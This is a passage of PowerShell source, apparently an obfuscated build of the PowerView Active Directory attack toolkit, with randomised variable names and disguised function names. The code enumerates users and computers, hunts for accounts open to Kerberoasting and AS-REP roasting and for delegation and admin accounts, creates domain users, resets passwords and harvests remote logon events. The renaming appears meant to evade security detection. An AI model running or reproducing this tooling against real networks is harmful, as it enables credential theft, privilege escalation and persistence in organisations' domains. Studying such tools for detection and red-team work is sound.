        $JmMZLdNK99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $LPuMBzrP99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $XkaFUcnD99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['LDAPFilter']) { $cODXoeui99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $NpqvEESm99 = Md -StsWGohF99 $StsWGohF99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $NpqvEESm99 = Md -StsWGohF99 $StsWGohF99 -DegNROrc99 $DegNROrc99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[timbre] Enumerated forest '$NpqvEESm99' for target domain '$StsWGohF99'"
        }
        $QdHnMuki99 = @{}
        if ($PSBoundParameters['Credential']) { $QdHnMuki99['Credential'] = $DegNROrc99 }
        if ($NpqvEESm99) {
            $QdHnMuki99['Forest'] = $NpqvEESm99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[timbre] Using specified -EyszHYHf99"
            $sfpcjzhT99 = $EyszHYHf99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[timbre] Extracting property names from -TNdhapTZ99 to use as the reference property set"
            $sfpcjzhT99 = Get-Member -miMAbRWZ99 $TNdhapTZ99 -MemberType NoteProperty | Select-Object -Expand Name
            $QMIulouN99 = $TNdhapTZ99.objectclass | Select-Object -Last 1
            Write-Verbose "[timbre] Calculated ReferenceObjectClass : $QMIulouN99"
        }
        else {
            Write-Verbose "[timbre] Using the default reference property set for the object class '$seaFVLzL99'"
        }
        if (($seaFVLzL99 -eq 'User') -or ($QMIulouN99 -eq 'User')) {
            $icXJoNUd99 = Lille @SearcherArguments
            if (-not $sfpcjzhT99) {
                $sfpcjzhT99 = $JmMZLdNK99
            }
        }
        elseif (($seaFVLzL99 -eq 'Group') -or ($QMIulouN99 -eq 'Group')) {
            $icXJoNUd99 = ledger @SearcherArguments
            if (-not $sfpcjzhT99) {
                $sfpcjzhT99 = $LPuMBzrP99
            }
        }
        elseif (($seaFVLzL99 -eq 'Computer') -or ($QMIulouN99 -eq 'Computer')) {
            $icXJoNUd99 = snivel @SearcherArguments
            if (-not $sfpcjzhT99) {
                $sfpcjzhT99 = $XkaFUcnD99
            }
        }
        else {
            throw "[timbre] Invalid class: $seaFVLzL99"
        }
        ForEach ($Object in $icXJoNUd99) {
            $kVUCshvC99 = Get-Member -miMAbRWZ99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($MlRCkoWP99 in $kVUCshvC99) {
                if ($sfpcjzhT99 -NotContains $MlRCkoWP99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $MlRCkoWP99
                    $Out | Add-Member Noteproperty 'Value' $Object.$MlRCkoWP99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function Lille {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [Switch]
        $SPN,
        [Switch]
        $dtjbUKfI99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $PTEiKXom99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $nllkxGXR99,
        [Switch]
        $zgRkFHVF99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $mlDDRMTS99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $pWDewsuN99 = [Enum]::GetNames($uxoaxGDG99)
        $pWDewsuN99 = $pWDewsuN99 | ForEach-Object {$_; "NOT_$_"}
        pharyngeal -Name UACFilter -WsFzHTtP99 $pWDewsuN99 -Type ([array])
    }
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $TyAvUtRw99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            pharyngeal -preAkVMm99 -yCVbxJse99 $PSBoundParameters
        }
        if ($TyAvUtRw99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^S-1-') {
                    $gkqsWVjp99 += "(objectsid=$nwpngcEV99)"
                }
                elseif ($nwpngcEV99 -match '^CN=') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Lille] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $TyAvUtRw99 = Zimbabweans @SearcherArguments
                        if (-not $TyAvUtRw99) {
                            Write-Warning "[Lille] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                elseif ($nwpngcEV99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $wqHaFAge99 = (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                }
                elseif ($nwpngcEV99.Contains('\')) {
                    $MAfzZiLi99 = $nwpngcEV99.Replace('\28', '(').Replace('\29', ')') | loomed -ffAeRAxr99 Canonical
                    if ($MAfzZiLi99) {
                        $GOrSdVAL99 = $MAfzZiLi99.SubString(0, $MAfzZiLi99.IndexOf('/'))
                        $XOIvwKgj99 = $nwpngcEV99.Split('\')[1]
                        $gkqsWVjp99 += "(samAccountName=$XOIvwKgj99)"
                        $cODXoeui99['Domain'] = $GOrSdVAL99
                        Write-Verbose "[Lille] Extracted domain '$GOrSdVAL99' from '$nwpngcEV99'"
                        $TyAvUtRw99 = Zimbabweans @SearcherArguments
                    }
                }
                else {
                    $gkqsWVjp99 += "(samAccountName=$nwpngcEV99)"
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Lille] Searching for non-null service principal names'
                $ypcTqVPU99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Lille] Searching for users who can be delegated'
                $ypcTqVPU99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[Lille] Searching for users who are sensitive and not trusted for delegation'
                $ypcTqVPU99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[Lille] Searching for adminCount=1'
                $ypcTqVPU99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Lille] Searching for users that are trusted to authenticate for other principals'
                $ypcTqVPU99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[Lille] Searching for user accounts that do not require kerberos preauthenticate'
                $ypcTqVPU99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Lille] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            $oTHeDzbF99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $JYRSSqAf99 = $_.Substring(4)
                    $lLaNpQqS99 = [Int]($uxoaxGDG99::$JYRSSqAf99)
                    $ypcTqVPU99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$lLaNpQqS99))"
                }
                else {
                    $lLaNpQqS99 = [Int]($uxoaxGDG99::$_)
                    $ypcTqVPU99 += "(userAccountControl:1.2.840.113556.1.4.803:=$lLaNpQqS99)"
                }
            }
            $TyAvUtRw99.filter = "(&(samAccountType=805306368)$ypcTqVPU99)"
            Write-Verbose "[Lille] filter string: $($TyAvUtRw99.filter)"
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $TyAvUtRw99.FindOne() }
            else { $oboKDFwv99 = $TyAvUtRw99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = proletarian -pwEfoKvn99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[Lille] Error disposing of the Results object: $_"
                }
            }
            $TyAvUtRw99.dispose()
        }
    }
}
function joyed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $kQCfdznv99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $pwKaDqsW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $RjiorarN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SPrwZXab99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    $DryfxeRC99 = @{
        'Identity' = $kQCfdznv99
    }
    if ($PSBoundParameters['Domain']) { $DryfxeRC99['Domain'] = $StsWGohF99 }
    if ($PSBoundParameters['Credential']) { $DryfxeRC99['Credential'] = $DegNROrc99 }
    $zclAxVXh99 = orthodoxy @ContextArguments
    if ($zclAxVXh99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($zclAxVXh99.Context)
        $User.SamAccountName = $zclAxVXh99.Identity
        $bTKvwjFI99 = New-Object System.Management.Automation.PSCredential('a', $pwKaDqsW99)
        $User.SetPassword($bTKvwjFI99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $zclAxVXh99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $RjiorarN99
        }
        else {
            $User.DisplayName = $zclAxVXh99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $SPrwZXab99
        }
        Write-Verbose "[joyed] Attempting to create user '$kQCfdznv99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[joyed] User '$kQCfdznv99' successfully created"
            $User
        }
        catch {
            Write-Warning "[joyed] Error creating user '$kQCfdznv99' : $_"
        }
    }
}
function canny {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $FMEdvzGY99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $pwKaDqsW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    $DryfxeRC99 = @{ 'Identity' = $FMEdvzGY99 }
    if ($PSBoundParameters['Domain']) { $DryfxeRC99['Domain'] = $StsWGohF99 }
    if ($PSBoundParameters['Credential']) { $DryfxeRC99['Credential'] = $DegNROrc99 }
    $zclAxVXh99 = orthodoxy @ContextArguments
    if ($zclAxVXh99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($zclAxVXh99.Context, $FMEdvzGY99)
        if ($User) {
            Write-Verbose "[canny] Attempting to set the password for user '$FMEdvzGY99'"
            try {
                $bTKvwjFI99 = New-Object System.Management.Automation.PSCredential('a', $pwKaDqsW99)
                $User.SetPassword($bTKvwjFI99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[canny] Password for user '$FMEdvzGY99' successfully reset"
            }
            catch {
                Write-Warning "[canny] Error setting password for user '$FMEdvzGY99' : $_"
            }
        }
        else {
            Write-Warning "[canny] Unable to find user '$FMEdvzGY99'"
        }
    }
}
function quartette {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $OWJFpvqv99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $OenSunKo99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $KZqnpeYT99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ReeyziuJ99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($OWJFpvqv99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($OenSunKo99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($OWJFpvqv99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($OenSunKo99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $HxxCmAXG99 = @{
            'FilterXPath' = $ReeyziuJ99
            'LogName' = 'Security'
            'MaxEvents' = $KZqnpeYT99
        }
        if ($PSBoundParameters['Credential']) { $HxxCmAXG99['Credential'] = $DegNROrc99 }
    }
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $HxxCmAXG99['ComputerName'] = $YaYHUvEO99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $pwEfoKvn99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $pwEfoKvn99[5].Value.EndsWith('$')) {
                            $MhFNKxWo99 = New-Object PSObject -Property @{
                                ComputerName              = $YaYHUvEO99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $pwEfoKvn99[0].Value.ToString()
                                SubjectUserName           = $pwEfoKvn99[1].Value
                                SubjectDomainName         = $pwEfoKvn99[2].Value
                                SubjectLogonId            = $pwEfoKvn99[3].Value
                                TargetUserSid             = $pwEfoKvn99[4].Value.ToString()
                                TargetUserName            = $pwEfoKvn99[5].Value
                                TargetDomainName          = $pwEfoKvn99[6].Value
                                TargetLogonId             = $pwEfoKvn99[7].Value
                                LogonType                 = $pwEfoKvn99[8].Value
                                LogonProcessName          = $pwEfoKvn99[9].Value
                                AuthenticationPackageName = $pwEfoKvn99[10].Value
                                WorkstationName           = $pwEfoKvn99[11].Value
                                LogonGuid                 = $pwEfoKvn99[12].Value
                                TransmittedServices       = $pwEfoKvn99[13].Value
                                LmPackageName             = $pwEfoKvn99[14].Value
                                KeyLength                 = $pwEfoKvn99[15].Value
                                ProcessId                 = $pwEfoKvn99[16].Value
                                ProcessName               = $pwEfoKvn99[17].Value
                                IpAddress                 = $pwEfoKvn99[18].Value
                                IpPort                    = $pwEfoKvn99[19].Value
                                ImpersonationLevel        = $pwEfoKvn99[20].Value
                                RestrictedAdminMode       = $pwEfoKvn99[21].Value
                                TargetOutboundUserName    = $pwEfoKvn99[22].Value
                                TargetOutboundDomainName  = $pwEfoKvn99[23].Value
                                VirtualAccount            = $pwEfoKvn99[24].Value
                                TargetLinkedLogonId       = $pwEfoKvn99[25].Value
                                ElevatedToken             = $pwEfoKvn99[26].Value
                            }
                            $MhFNKxWo99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $MhFNKxWo99
                        }
                    }
                    4648 {
                        if((-not $pwEfoKvn99[5].Value.EndsWith('$')) -and ($pwEfoKvn99[11].Value -match 'taskhost\.exe')) {
                            $MhFNKxWo99 = New-Object PSObject -Property @{
                                ComputerName              = $YaYHUvEO99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $pwEfoKvn99[0].Value.ToString()
                                SubjectUserName   = $pwEfoKvn99[1].Value
                                SubjectDomainName = $pwEfoKvn99[2].Value
                                SubjectLogonId    = $pwEfoKvn99[3].Value
                                LogonGuid         = $pwEfoKvn99[4].Value.ToString()
                                TargetUserName    = $pwEfoKvn99[5].Value
                                TargetDomainName  = $pwEfoKvn99[6].Value
                                TargetLogonGuid   = $pwEfoKvn99[7].Value
                                TargetServerName  = $pwEfoKvn99[8].Value
                                TargetInfo        = $pwEfoKvn99[9].Value
                                ProcessId         = $pwEfoKvn99[10].Value
                                ProcessName       = $pwEfoKvn99[11].Value
                                IpAddress         = $pwEfoKvn99[12].Value
                                IpPort            = $pwEfoKvn99[13].Value
                            }
                            $MhFNKxWo99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $MhFNKxWo99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function puberty {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $ajEoQrcP99 = @{}
    if ($PSBoundParameters['Credential']) { $ajEoQrcP99['Credential'] = $DegNROrc99 }
    try {
        $mIrEuNJK99 = (songsters @ForestArguments).schema.name
    }
    catch {
        throw '[puberty] Error in retrieving forest schema path from songsters'
    }
    if (-not $mIrEuNJK99) {
        throw '[puberty] Error in retrieving forest schema path from songsters'
    }
    $cODXoeui99 = @{
        'SearchBase' = $mIrEuNJK99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
    if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
    if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
    if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
    $ZkDmceCo99 = Zimbabweans @SearcherArguments
    if ($ZkDmceCo99) {
        try {
            $oboKDFwv99 = $ZkDmceCo99.FindAll()
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[puberty] Error disposing of the Results object: $_"
                }
            }
            $ZkDmceCo99.dispose()
        }
        catch {
            Write-Verbose "[puberty] Error in building GUID map: $_"
        }
    }
    $cODXoeui99['SearchBase'] = $mIrEuNJK99.replace('Schema','Extended-Rights')
    $cODXoeui99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $yICPCdYR99 = Zimbabweans @SearcherArguments
    if ($yICPCdYR99) {
        try {
            $oboKDFwv99 = $yICPCdYR99.FindAll()
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[puberty] Error disposing of the Results object: $_"
                }
            }
            $yICPCdYR99.dispose()
        }
        catch {
            Write-Verbose "[puberty] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function snivel {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $FMEdvzGY99,
        [Switch]
        $GNUthHex99,
        [Switch]
        $zgRkFHVF99,
        [Switch]
        $NjpDcXaY99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $MHzuHSVj99,
        [ValidateNotNullOrEmpty()]
        [String]
        $IooYAKOh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AxVRNJsI99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $pWDewsuN99 = [Enum]::GetNames($uxoaxGDG99)
        $pWDewsuN99 = $pWDewsuN99 | ForEach-Object {$_; "NOT_$_"}
        pharyngeal -Name UACFilter -WsFzHTtP99 $pWDewsuN99 -Type ([array])
    }
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
